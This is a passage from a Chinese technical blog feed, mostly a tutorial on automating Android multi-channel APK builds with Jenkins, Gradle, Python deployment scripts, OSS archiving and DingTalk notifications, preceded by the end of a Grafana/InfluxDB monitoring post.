<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/ping.png" alt="此处输入图片的描述"></p>
<ul>
<li>图表展示</li>
</ul>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/view.png" alt="此处输入图片的描述"></p>
<p>详细demo可参考:<a href="http://play.grafana.org/" target="_blank" rel="external">http://play.grafana.org/</a></p>
<h4 id="问题总结"><a href="#问题总结" class="headerlink" title="问题总结"></a>问题总结</h4><p><strong>问题 :</strong>在使用influxdb0.12.x版本和Grafana2.6时出现multiple query syntax的bug,原因是influxdb的apiwent</p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/multiquery.png" alt="此处输入图片的描述"></p>
<p><strong>解决方法:</strong> 升级Grafana2.6到Grafana3.0-beta1以上版本<br> <a href="https://github.com/grafana/grafana/commit/ed62822d442569e7ba287ff63d83a069a596c458" target="_blank" rel="external">https://github.com/grafana/grafana/commit/ed62822d442569e7ba287ff63d83a069a596c458</a></p>
<h4 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h4><blockquote>
<p><a href="http://docs.grafana.org" target="_blank" rel="external">http://docs.grafana.org</a><br><a href="https://collectd.org/wiki/index.php/Table_of_Plugins" target="_blank" rel="external">https://collectd.org/wiki/index.php/Table_of_Plugins</a><br><a href="https://docs.influxdata.com/influxdb/v0.12/introduction/getting_started/" target="_blank" rel="external">https://docs.influxdata.com/influxdb/v0.12/introduction/getting_started/</a></p>
</blockquote>
]]></content>
      
        <categories>
            
            <category> 系统监控 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[Android多渠道打包这样做才酸爽！？]]></title>
      <url>/2016/04/21/android-pack-deploy.html</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>　　多渠道主要目的是为了统计各个应用市场用户数据分析(比如活跃数，崩溃率等)，收集用户信息，这时需要唯一标识来区分这些渠道，本文主要针对多渠道(几百个渠道甚至更多的情况)如何快速打包?</p>
<h4 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h4><blockquote>
<ul>
<li>Jenkins集成Gradle实现打包自动化</li>
<li>通过Jenkins参数化构建实现自定义环境和渠道打包，签名</li>
<li>测试包自动上传fir并通过钉钉发送通知</li>
<li>正式包按版本归档到OSS，发布时拷贝包到发布目录</li>
<li>自动刷新CDN</li>
</ul>
</blockquote>
<h4 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h4><blockquote>
<ul>
<li>系统 : Centos6.5 x64</li>
<li>jdk-7u79-linux-x64</li>
<li>android-sdk_r24.4.1-linux</li>
<li>gradle-2.2.1</li>
<li>Python-2.7.10(操作DingTalk和OSS API)</li>
<li>Jenkins2.0/Tomcat-7.0.65</li>
</ul>
</blockquote>
<h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><p>1.安装JDK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget &apos;http://download.oracle.com/otn-pub/java/jdk/7u79-b15/jdk-7u79-linux-x64.tar.gz?AuthParam=1460974294_526e0f8471004294cb163c9c730ba4f9&apos; -O jdk1.7.0_79.tar.gz</div><div class="line">tar xf jdk-7u79-linux-x64.tar.gz -C /usr/local/jdk1.7.0_79</div></pre></td></tr></table></figure>
<p>2.安装Python2.7.10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">wget https://www.python.org/ftp/python/2.7.10/Python-2.7.10.tgz</div><div class="line">tar xf Python-2.7.10.tgz</div><div class="line">cd Python-2.7.10</div><div class="line">./configure </div><div class="line">make -j4</div><div class="line">make install</div><div class="line">sed -i &apos;s#python/python2.6#g&apos; /usr/bin/yum</div></pre></td></tr></table></figure>
<p>3.安装Android的SDK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget http://dl.google.com/android/android-sdk_r24.4.1-linux.tgz</div><div class="line">tar xf android-sdk_r24.4.1-linux.tgz -C /usr/local/android-sdk-linux</div></pre></td></tr></table></figure>
<p>4.安装tomcat和jenkins</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">yum -y install tomcat</div><div class="line">wget http://mirrors.jenkins-ci.org/war-rc/2.0/jenkins.war -O /usr/share/tomcat/webapps/jenkins.war</div></pre></td></tr></table></figure>
<p>5.配置环境变量，启动服务</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">vim /etc/profile</div><div class="line">export ANDROID_HOME=/usr/local/android-sdk-linux</div><div class="line">export JAVA_HOME=/usr/local/jdk1.7.0_80</div><div class="line">export PATH=$PATH:$JAVA_HOME/bin:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools</div><div class="line">source /etc/profile</div><div class="line">service tomcat start</div><div class="line">Jenkins访问地址:http://192.168.2.2:8080/jenkins/</div></pre></td></tr></table></figure>
<p>6.安装Android SDK依赖包</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">由于Android SDK工具基于32位在64位系统上需要安装32位必须安装的i386依赖库</div><div class="line">yum install -y glibc.i686 glibc-devel.i686 libstdc++.i686 zlib-devel.i686 ncurses-devel.i686 libX11-devel.i686 libXrender.i686 libXrandr.i686</div></pre></td></tr></table></figure>
<p>####安装更新对应版本的SDK</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">由于国内直接解析访问dl.google.com,dl-ssl.google.com域名较慢，可以通过更改hosts方式解决:</div><div class="line">dig dl.google.com dl-ssl.google.com</div><div class="line">将获得IP写入/etc/hosts,例如:</div><div class="line">203.208.43.110 dl.google.com</div><div class="line">74.125.23.91 dl-ssl.google.com</div><div class="line">查看SDK相关列表</div><div class="line">android  list sdk --all</div><div class="line">Packages available for installation or update: 150</div><div class="line">alias: archives/1689.html</div><div class="line">alias: archives/1689.html</div><div class="line">   1- Android SDK Tools, revision 25.1.1</div><div class="line">   2- Android SDK Tools, revision 25.1.3 rc1</div><div class="line">   3- Android SDK Platform-tools, revision 23.1</div><div class="line">   4- Android SDK Platform-tools, revision 24 rc2</div><div class="line">   5- Android SDK Build-tools, revision 24 rc3</div><div class="line">   6- Android SDK Build-tools, revision 23.0.3</div><div class="line">   7- Android SDK Build-tools, revision 23.0.2</div><div class="line">   8- Android SDK Build-tools, revision 23.0.1</div><div class="line">   9- Android SDK Build-tools, revision 23 (Obsolete)</div><div class="line">  10- Android SDK Build-tools, revision 22.0.1</div><div class="line">  11- Android SDK Build-tools, revision 22 (Obsolete)</div><div class="line">  12- Android SDK Build-tools, revision 21.1.2</div><div class="line">  13- Android SDK Build-tools, revision 21.1.1 (Obsolete)</div><div class="line">  14- Android SDK Build-tools, revision 21.1 (Obsolete)</div><div class="line">  15- Android SDK Build-tools, revision 21.0.2 (Obsolete)</div><div class="line">  16- Android SDK Build-tools, revision 21.0.1 (Obsolete)</div><div class="line">  17- Android SDK Build-tools, revision 21 (Obsolete)</div><div class="line">  18- Android SDK Build-tools, revision 20</div><div class="line">  19- Android SDK Build-tools, revision 19.1</div><div class="line">  20- Android SDK Build-tools, revision 19.0.3 (Obsolete)</div><div class="line">  21- Android SDK Build-tools, revision 19.0.2 (Obsolete)</div><div class="line">  22- Android SDK Build-tools, revision 19.0.1 (Obsolete)</div><div class="line">  23- Android SDK Build-tools, revision 19 (Obsolete)</div><div class="line">  24- Android SDK Build-tools, revision 18.1.1 (Obsolete)</div><div class="line">  ...</div><div class="line">选择要安装项目的序号</div><div class="line">android  update sdk -u -a -t 5,6,7,31,34,136,137</div></pre></td></tr></table></figure>
<h4 id="手动编译测试Android项目"><a href="#手动编译测试Android项目" class="headerlink" title="手动编译测试Android项目"></a>手动编译测试Android项目</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">git clone git@git.maka.mobi:android/Android_demo.git</div><div class="line">cd Android_demo</div><div class="line">查看当前项目包含的tasks(此时若无gradle会自动下载安装)</div><div class="line">./gradlew  tasks</div><div class="line">清空build目录</div><div class="line">./gradlew clean</div><div class="line">编译打包所有环境包</div><div class="line">./gradlew assemble</div><div class="line">编译打包Debug包</div><div class="line">./gradlew assembleDebug</div><div class="line">编译打包Release包</div><div class="line">./gradlew assembleRelease</div></pre></td></tr></table></figure>
<h4 id="多渠道打包项目改造"><a href="#多渠道打包项目改造" class="headerlink" title="多渠道打包项目改造"></a>多渠道打包项目改造</h4><ol>
<li>包的签名在build.gradle中配置，打包后自动签名</li>
<li>由于META-INF目录下是存放签名信息的，用来保证apk包的完整性和安全，在生成apk时对文件做校验计算并把结果存放在META-INF目录中，安装apk包时应用管理器会按照同样的算法对包里的文件做校验，如果和META-INF中的内容不一致，则无法安装，通过修改apk包在重新打包基本不可能，以此来保证apk包的安全，因此在打完第一个包时，可以在META-INF目录中添加一个channel_wandoujia空文件,代码匹配这个文件获取渠道名wandoujia，来快速实现多渠道打包的目的</li>
<li>代码库根目录channel文件存放渠道名</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">apk包解压后目录结构:</div><div class="line">├── AndroidManifest.xml</div><div class="line">├── assets</div><div class="line">├── classes.dex</div><div class="line">├── lib</div><div class="line">├── META-INF</div><div class="line">│   ├── CERT.RSA</div><div class="line">│   ├── CERT.SF</div><div class="line">│   ├── channel_huawei</div><div class="line">│   └── MANIFEST.MF</div><div class="line">├── org</div><div class="line">├── res</div><div class="line">└── resources.arsc</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div></pre></td><td class="code"><pre><div class="line">Gradle(apk通过gradle签名)例子app/build.gradle:</div><div class="line">apply plugin: &apos;com.android.application&apos;</div><div class="line">android &#123;</div><div class="line">    compileSdkVersion 22</div><div class="line">    buildToolsVersion &apos;23.0.2&apos;</div><div class="line">    defaultConfig &#123;</div><div class="line">        applicationId &quot;com.maka.app&quot;</div><div class="line">        minSdkVersion 16</div><div class="line">        targetSdkVersion 22</div><div class="line">        versionCode 16</div><div class="line">        versionName &apos;2.0.0&apos;</div><div class="line"></div><div class="line">        //dex突破65535的限制</div><div class="line">        multiDexEnabled true</div><div class="line">    &#125;</div><div class="line">    dexOptions &#123;</div><div class="line">        jumboMode = true</div><div class="line">        incremental true</div><div class="line">        javaMaxHeapSize &quot;4g&quot;</div><div class="line">        preDexLibraries = false</div><div class="line">        incremental true</div><div class="line">    &#125;</div><div class="line">    signingConfigs &#123;</div><div class="line">        debug &#123;</div><div class="line">            storeFile file(&quot;../key.jks&quot;)</div><div class="line">            storePassword &quot;helloworld&quot;</div><div class="line">            keyAlias &quot;helloworld&quot;</div><div class="line">            keyPassword &quot;helloworld&quot;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    packagingOptions &#123;</div><div class="line">        exclude &apos;META-INF/LICENCE.txt&apos;</div><div class="line">        exclude &apos;META-INF/LICENSE.txt&apos;</div><div class="line">        exclude &apos;META-INF/NOTICE.txt&apos;</div><div class="line">    &#125;</div><div class="line">    lintOptions &#123;</div><div class="line">        checkReleaseBuilds false</div><div class="line">        // Or, if you prefer, you can continue to check for errors in release builds,</div><div class="line">        // but continue the build even when errors are found:</div><div class="line">        abortOnError false</div><div class="line">    &#125;</div><div class="line">    buildTypes &#123;</div><div class="line">        debug &#123;</div><div class="line">            // 显示Log</div><div class="line">            buildConfigField &quot;boolean&quot;, &quot;LOG_DEBUG&quot;, &quot;true&quot;</div><div class="line">            versionNameSuffix &quot;-debug&quot;</div><div class="line">            minifyEnabled false</div><div class="line">            zipAlignEnabled true</div><div class="line">            shrinkResources false</div><div class="line">            signingConfig signingConfigs.debug</div><div class="line">            manifestPlaceholders = [</div><div class="line">                    UMENG_APP_KEY   : &quot;556ac653162s58e06c0000218&quot;,</div><div class="line">                    UMENG_APP_SECRET: &quot;2a231041d6aa10ec2b2s933003135a7&quot;</div><div class="line">            ]</div><div class="line">            //Server config</div><div class="line">            buildConfigField &quot;boolean&quot;, &quot;SELECT_SERVER&quot;, &quot;true&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_IP&quot;, &quot;\&quot;http://test.api.simlinux.com/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_PROJECT_URL&quot;, &quot;\&quot;http://test.viewer.simlinux.com/k/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_PICTURE_URL&quot;, &quot;\&quot;http://test.img1.simlinux.com/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_RES_URL&quot;, &quot;\&quot;http://test.res.simlinux.com/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_IP&quot;, &quot;\&quot;http://api.simlinux.com/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_PROJECT_URL&quot;, &quot;\&quot;http://viewer.simlinux.com/k/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_PICTURE_URL&quot;, &quot;\&quot;http://img1.simlinux.com/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_RES_URL&quot;, &quot;\&quot;http://res.simlinux.com/\&quot;&quot;</div><div class="line"></div><div class="line">        &#125;</div><div class="line">        release &#123;</div><div class="line">            // 不显示Log</div><div class="line">            buildConfigField &quot;boolean&quot;, &quot;LOG_DEBUG&quot;, &quot;false&quot;</div><div class="line">            minifyEnabled true</div><div class="line">            zipAlignEnabled true</div><div class="line">            // 移除无用的resource文件</div><div class="line">            shrinkResources true</div><div class="line">            proguardFile &apos;proguard-project.txt&apos;</div><div class="line">            debuggable false</div><div class="line">            shrinkResources false</div><div class="line">            signingConfig signingConfigs.debug</div><div class="line">            manifestPlaceholders = [</div><div class="line">                    UMENG_APP_KEY   : &quot;556ac6s3162358e06c0000218&quot;,</div><div class="line">                    UMENG_APP_SECRET: &quot;2a231041d6aa10ec2b2s933003135a7&quot;</div><div class="line">            ]</div><div class="line">            //Server config</div><div class="line">            buildConfigField &quot;boolean&quot;, &quot;SELECT_SERVER&quot;, &quot;false&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_IP&quot;, &quot;\&quot;\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_PROJECT_URL&quot;, &quot;\&quot;\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_PICTURE_URL&quot;, &quot;\&quot;\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;TEST_RES_URL&quot;, &quot;\&quot;\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_IP&quot;, &quot;\&quot;http://api.simlinux.com/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_PROJECT_URL&quot;, &quot;\&quot;http://viewer.simlinux.com/k/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_PICTURE_URL&quot;, &quot;\&quot;http://img1.simlinux.com/\&quot;&quot;</div><div class="line">            buildConfigField &quot;String&quot;, &quot;FORMAL_RES_URL&quot;, &quot;\&quot;http://res.simlinux.com/\&quot;&quot;</div><div class="line"></div><div class="line">        &#125;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    applicationVariants.all &#123; variant -&amp;gt;</div><div class="line">        variant.outputs.each &#123; output -&amp;gt;</div><div class="line">            def outputFile = output.outputFile</div><div class="line">            if (outputFile != null &amp;amp;&amp;amp; outputFile.name.endsWith(&apos;.apk&apos;)) &#123;</div><div class="line">                def fileName = outputFile.name.replace(&quot;.apk&quot;, &quot;-$&#123;defaultConfig.versionName&#125;.apk&quot;)</div><div class="line">                output.outputFile = new File(outputFile.parent, fileName)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    productFlavors &#123;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"></div><div class="line">repositories &#123;</div><div class="line">    flatDir &#123;</div><div class="line">        dirs &apos;libs&apos; //this way we can find the .aar file in libs</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">dependencies &#123;</div><div class="line">    compile &apos;com.google.code.gson:gson:2.3.1&apos;</div><div class="line">    compile &apos;com.github.japgolly.android:svg-android:2.0.6&apos;</div><div class="line">    compile fileTree(dir: &apos;libs&apos;, include: [&apos;*.jar&apos;])</div><div class="line">    compile &apos;com.android.support:appcompat-v7:22.2.0&apos;</div><div class="line">    compile &apos;com.github.rey5137:material:1.2.1&apos;</div><div class="line">    compile &apos;com.squareup.okhttp:okhttp-apache:2.4.0&apos;</div><div class="line">    compile(name: &apos;vds-sdk-release&apos;, ext: &apos;aar&apos;)</div><div class="line">    compile &apos;com.android.support:multidex:1.0.0&apos;</div><div class="line">    compile project(&apos;:PushSDK&apos;)</div><div class="line">    compile &apos;com.google.zxing:core:3.2.1&apos;</div><div class="line">    compile &apos;com.android.support:recyclerview-v7:24.0.0-alpha1&apos;</div><div class="line">    compile &apos;com.rengwuxian.materialedittext:library:2.1.4&apos;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div></pre></td><td class="code"><pre><div class="line">匹配META-INF/channel_wandoujia文件名读取wandoujia渠道</div><div class="line"></div><div class="line">    public static String readChanel() &#123;</div><div class="line">        ApplicationInfo appInfo = ContextManager.getContext().getApplicationInfo();</div><div class="line">        String sourceDir = appInfo.sourceDir;</div><div class="line">        String ret = &quot;&quot;;</div><div class="line">        ZipFile zipfile = null;</div><div class="line">        Log.i(TAG, &quot;---begin-ret=&quot; + ret);</div><div class="line">        try &#123;</div><div class="line">            zipfile = new ZipFile(sourceDir);</div><div class="line">            Enumeration&amp;lt;?&amp;gt; entries = zipfile.entries();</div><div class="line">            while (entries.hasMoreElements()) &#123;</div><div class="line">                ZipEntry entry = ((ZipEntry) entries.nextElement());</div><div class="line">                String entryName = entry.getName();</div><div class="line">                if (entryName.startsWith(&quot;META-INF/channel&quot;)) &#123;</div><div class="line">                    ret = entryName;</div><div class="line">                    break;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125; catch (IOException e) &#123;</div><div class="line">            e.printStackTrace();</div><div class="line">        &#125; finally &#123;</div><div class="line">            if (zipfile != null) &#123;</div><div class="line">                try &#123;</div><div class="line">                    zipfile.close();</div><div class="line">                &#125; catch (IOException e) &#123;</div><div class="line">                    e.printStackTrace();</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div></pre></td></tr></table></figure>
<h4 id="Android多渠道打包流程"><a href="#Android多渠道打包流程" class="headerlink" title="Android多渠道打包流程"></a>Android多渠道打包流程</h4><p>基于上述方式实现多渠道打包流程如下:</p>
<ul>
<li>执行gradlew clean清除build目录</li>
<li>执行gradlew assemble编译打包Debug/Release(已自动签名)</li>
<li>上传Debug包到Fir</li>
<li>通过DingTalk发送通知信息到QA讨论组(发送提测apk包版本，下载地址及扫描下载二维码)</li>
<li>提测不通过，修复bug后再次执行前四步</li>
<li>提测通过后，点击Jenkins打包归档多渠道按钮，将执行生成多渠道包并归档包到本地目录/data/2.0.1/xxx.apk</li>
<li>可选择此步上传归档文件到OSS</li>
<li>点击Jenkins发布按钮将最新版本相关渠道归档拷贝至OSS发布目录</li>
<li>刷新CDN生效</li>
<li>通过DingTalk发送通知信息到QA讨论组哪些渠道已经发布</li>
</ul>
<h4 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h4><h5 id="配置Jenkins"><a href="#配置Jenkins" class="headerlink" title="配置Jenkins"></a>配置Jenkins</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">插件: Dynamic Choice Parameter</div><div class="line">创建打包测试项目:Android-Test</div></pre></td></tr></table></figure>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/android-test.png" alt=""><br><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/android-test-choice.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">通过Groovy脚本获取分支</div><div class="line">def ver_keys = [ &apos;bash&apos;, &apos;-c&apos;, &apos;cd /usr/share/tomcat/.jenkins/workspace/Android-Test;git branch -a|grep remotes|cut -d &quot;/&quot; -f3|grep -v HEAD|sort&apos; ]</div><div class="line">    ver_keys.execute().text.tokenize(&apos;\n&apos;)</div><div class="line"></div><div class="line">构建脚本</div><div class="line">#!/bin/bash</div><div class="line">PATH=/usr/lib64/qt-3.3/bin:/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/jdk1.7.0_80/bin:/usr/local/android-sdk-linux/tools:/usr/local/android-sdk-linux/platform-tools:/usr/local/gradle-2.2.1/bin:/usr/share/tomcat/bin</div><div class="line"></div><div class="line">cd $&#123;WORKSPACE&#125;</div><div class="line">git checkout $&#123;BranchToDeploy&#125;</div><div class="line">git pull -f</div><div class="line"></div><div class="line">if [ &quot;$&#123;EnvToDeploy&#125;&quot;  = &quot;All Env&quot; ];then</div><div class="line"></div><div class="line">        $&#123;WORKSPACE&#125;/gradlew clean</div><div class="line">        $&#123;WORKSPACE&#125;/gradlew assemble</div><div class="line"></div><div class="line">else</div><div class="line">        $&#123;WORKSPACE&#125;/gradlew clean</div><div class="line">        $&#123;WORKSPACE&#125;/gradlew assemble$&#123;EnvToDeploy&#125;</div><div class="line"></div><div class="line">fi</div><div class="line">#测试包上传fir，发钉钉通知</div><div class="line">/usr/local/bin/python /usr/share/tomcat/AndroidDeploy/androidtest.py</div></pre></td></tr></table></figure>
<p><strong>创建多渠道包归档项目:Android-Archive</strong></p>
<p><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/android-archive.png" alt=""><br><img src="http://ow1schdt5.bkt.clouddn.com/2016/04/android-archive-channel.png" alt=""></p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">获取channel列表</div><div class="line">def ver_keys = [ &apos;bash&apos;, &apos;-c&apos;, &apos;echo &quot;All Channels&quot;; cat /usr/share/tomcat/.jenkins/workspace/MAKA-Android-Testing/channels&apos; ]</div><div class="line">ver_keys.execute().text.tokenize(&apos;\n&apos;)</div><div class="line">构建脚本，更改渠道文件，上传OSS，发送钉钉通知</div><div class="line">python /usr/share/tomcat/AndroidDeploy/androidarchive.py</div></pre></td></tr></table></figure>
</code></pre><p><strong>创建发布多渠道包项目:Android-Deploy</strong></p>
<pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">构建脚本，通过OSS API拷贝要发布的归档渠道包到发布目录，发送钉钉通知</div><div class="line">python /usr/share/tomcat/AndroidDeploy/androiddeploy.py</div></pre></td></tr></table></figure>
</code></pre><h4 id="相关脚本"><a href="#相关脚本" class="headerlink" title="相关脚本"></a>相关脚本</h4><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">├── androidarchive.py       多渠道打包归档脚本</div><div class="line">├── androiddeploy.py        渠道包发布脚本</div><div class="line">├── androidtest.py          测试打包脚本</div><div class="line">└── libs</div><div class="line">    ├── chinanetcenter.py   刷新CDN脚本</div><div class="line">    ├── dingtalk.py         钉钉发送消息,图片，分享脚本</div><div class="line">    ├── fir.py              测试包上传fir脚本</div><div class="line">    ├── __init__.py</div><div class="line">    └── libsoss.py          oss相关操作脚本(上传，拷贝等)</div><div class="line"></div><div class="line">具体代码可根据https://github.com/geekwolf/AppDeployment按照实际业务进行修改</div></pre></td></tr></table></figure>
</code></pre><h4 id="IOS打包流程"><a href="#IOS打包流程" class="headerlink" title="IOS打包流程"></a>IOS打包流程</h4><ul>
<li>xcodebuild clean 清理build目录</li>
<li>xcodebuild archive 选择不同的环境/BundleID/ProvisionProfile/CodeSigningIdentify 编译，签名生成xcarchive文件放到工程根路径下的 build 文件夹里</li>
<li>xcodebuild -exportArchive 打包生成ipa</li>
<li>测试包自动上传Fir,生产包手动更新AppStore</li>
<li>具体可参考脚本 <a href="https://github.com/geekwolf/AppDeployment/blob/master/IOSDeploy.sh" target="_blank" rel="external">https://github.com/geekwolf/AppDeployment/blob/master/IOSDeploy.sh</a></li>
</ul>
